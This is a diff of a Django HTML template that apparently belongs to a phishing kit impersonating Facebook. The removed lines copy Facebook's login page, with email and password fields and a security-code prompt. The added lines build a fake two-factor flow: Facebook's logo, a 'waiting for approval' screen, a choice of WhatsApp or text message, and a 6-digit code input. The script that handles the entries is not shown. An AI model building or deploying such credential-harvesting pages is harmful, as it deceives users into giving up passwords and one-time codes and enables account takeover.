@@ -1,104 +1,96 @@
 {% load static %}
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>facebook - Log In or Create New Account</title>
-    <link rel="stylesheet" href="{% static "style.css" %}">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Multi-Step Authentication</title>
+    <script src="https://cdn.tailwindcss.com"></script>
 </head>
 <body>
-    <div class="container">
-        <div class="logo-container">
-            <h1 class="logo">facebook</h1>
-        </div>
-        
-        <div class="login-container">
-            <form id="login-form">
-                <div class="form-group">
-                    <input type="text" id="email" placeholder="Email or phone number" required>
-                </div>
-                <div class="form-group">
-                    <input type="password" id="password" placeholder="Password" required>
-                </div>
-                <button type="submit" class="login-button">Log In</button>
-            </form>
+    <!-- Main Container -->
+    <div class="flex flex-col items-center justify-center min-h-screen bg-gray-100 p-6">
+        <!-- Screen: Notification Approval -->
+        <div id="notification-screen" class="bg-white p-8 rounded-lg shadow-lg max-w-lg text-center">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="h-8 w-8 text-blue-600 mx-auto">
+                <path fill="currentColor" d="M22.675 0h-21.35C.595 0 0 .595 0 1.326v21.348C0 23.405.595 24 1.326 24H12.82v-9.294H9.692v-3.622h3.128V8.413c0-3.1 1.893-4.788 4.659-4.788 1.325 0 2.463.099 2.795.143v3.24l-1.918.001c-1.504 0-1.794.715-1.794 1.763v2.31h3.587l-.467 3.622h-3.12V24h6.116c.73 0 1.325-.595 1.325-1.326V1.326C24 .595 23.405 0 22.675 0z"/>
+            </svg>
+            <h1 class="text-2xl font-bold mt-2">Check your notifications on another device</h1>
+            <p class="text-gray-600 mt-2">We sent a notification to you. Check your Facebook notifications there and approve the login to continue.</p>
             
-            <div class="links-container">
-                <a href="#" class="forgot-link">Forgotten password?</a>
+            <div class="my-6">
+                <img src="{% static 'images/first.png' %}" alt="Notification Image" class="w-full rounded-lg">
             </div>
             
-            <div class="divider"></div>
+            <div class="flex items-center justify-center gap-2 text-gray-600">
+                <span class="text-lg">&#8226;&#8226;&#8226;</span>
+                <div>
+                    <p class="font-semibold">Waiting for approval</p>
+                    <p class="text-sm">It may take a few minutes to get the notification on your other device.</p>
+                </div>
+            </div>
             
-            <button class="create-account-button">Create new account</button>
-        </div>
-    </div>
-    
-    <div id="security-check" class="hidden">
-        <div class="security-check-content">
-            <h2>Security Check</h2>
-            <p>For your security, we need to verify your identity. We've sent a code to your email. Please enter it below.</p>
-            <input type="text" id="security-code" placeholder="Enter security code" maxlength="6">
-            <button id="verify-security" class="verify-button">Continue</button>
-            <a href="#" class="try-another-way">Try another way</a>
-        </div>
-    </div>
-    
-    <footer>
-        <div class="language-selector">
-            <a href="#" class="active">English (UK)</a>
-            <a href="#">हिन्दी</a>
-            <a href="#">ਪੰਜਾਬੀ</a>
-            <a href="#">اردو</a>
-            <a href="#">தமிழ்</a>
-            <a href="#">বাংলা</a>
-            <a href="#">മലയാളം</a>
-            <a href="#">Español</a>
-            <a href="#">Português (Brasil)</a>
-            <a href="#">Français (France)</a>
-            <a href="#">Deutsch</a>
-            <a href="#" class="more-languages">+</a>
+            <button onclick="showAlternativeOptions()" class="w-full bg-gray-200 text-black py-2 rounded mt-6 hover:bg-gray-300">
+                Try Another Way
+            </button>
         </div>
         
-        <div class="footer-links">
-            <a href="#">Sign Up</a>
-            <a href="#">Log In</a>
-            <a href="#">Messenger</a>
-            <a href="#">facebook Lite</a>
-            <a href="#">Video</a>
-            <a href="#">Places</a>
-            <a href="#">Games</a>
-            <a href="#">Marketplace</a>
-            <a href="#">facebook Pay</a>
-            <a href="#">Oculus</a>
-            <a href="#">Portal</a>
-            <a href="#">Instagram</a>
-            <a href="#">Bulletin</a>
-            <a href="#">Local</a>
-            <a href="#">Fundraisers</a>
-            <a href="#">Services</a>
-            <a href="#">Voting Information Centre</a>
-            <a href="#">Groups</a>
-            <a href="#">About</a>
-            <a href="#">Create ad</a>
-            <a href="#">Create Page</a>
-            <a href="#">Developers</a>
-            <a href="#">Careers</a>
-            <a href="#">Privacy</a>
-            <a href="#">Cookies</a>
-            <a href="#">AdChoices</a>
-            <a href="#">Terms</a>
-            <a href="#">Help</a>
-            <a href="#">Contact uploading and non-users</a>
+        <!-- Screen: Alternative Verification -->
+        <div id="alternative-screen" class="bg-white p-8 rounded-lg shadow-lg max-w-lg text-center hidden">
+            <h1 class="text-2xl font-bold">Choose another way to log in</h1>
+            <p class="text-gray-600 mt-2">Select a method to receive your login code.</p>
+
+            <div class="mt-4 text-left space-y-3">
+                <label class="flex items-center gap-3 p-3 border rounded-lg cursor-pointer">
+                    <input type="radio" name="auth-method" checked>
+                    <span>Notification on another device</span>
+                </label>
+                <label class="flex items-center gap-3 p-3 border rounded-lg cursor-pointer" onclick="showOtpScreen()">
+                    <input type="radio" name="auth-method">
+                    <span>WhatsApp </span>
+                </label>
+                <label class="flex items-center gap-3 p-3 border rounded-lg cursor-pointer" onclick="showOtpScreen()">
+                    <input type="radio" name="auth-method">
+                    <span>Text message </span>
+                </label>
+            </div>
+            
+            <button class="w-full bg-blue-600 text-white py-2 rounded mt-6 hover:bg-blue-700">
+                Continue
+            </button>
         </div>
         
-        <div class="copyright">
-            facebook © 2025
+        <!-- Screen: OTP Verification -->
+        <div id="otp-screen" class="flex flex-col items-center justify-center min-h-screen bg-gray-100 p-6 hidden">
+            <div class="bg-white p-8 rounded-lg shadow-lg max-w-lg text-center">
+                <h2 class="text-lg text-gray-700">Check your text messages</h2>
+                <h1 class="text-2xl font-bold mt-2">Enter the code we sent to your device</h1>
+                <p class="text-gray-600 mt-2">Enter the 6-digit code sent to your phone to continue.</p>
+                
+                <div class="my-6">
+                    <img src="{% static 'images/first.png' %}" alt="OTP Verification Image" class="w-full rounded-lg">
+                </div>
+                
+                <input id="otp-input" type="text" placeholder="Code" class="w-full p-3 border rounded-lg text-center text-lg outline-none focus:ring-2 focus:ring-blue-500" maxlength="6">
+                
+                <p class="text-gray-600 text-sm mt-3">We can send a new code in <span id="countdown" class="font-semibold">2:37</span></p>
+                
+                <button id="continue-btn" class="w-full bg-blue-400 text-white py-2 rounded mt-6 cursor-not-allowed" >Continue</button>
+                <button onclick="showAlternativeOptions()" class="w-full bg-gray-200 text-black py-2 rounded mt-3 hover:bg-gray-300">Try Another Way</button>
+            </div>
         </div>
-    </footer>
-    
+    </div>
+
+  
     <script src="{% static 'scrip.js' %}"></script>
+
+    <style>
+        .hidden {
+            display: none;
+        }
+    </style>
+
 </body>
 </html>
+
 
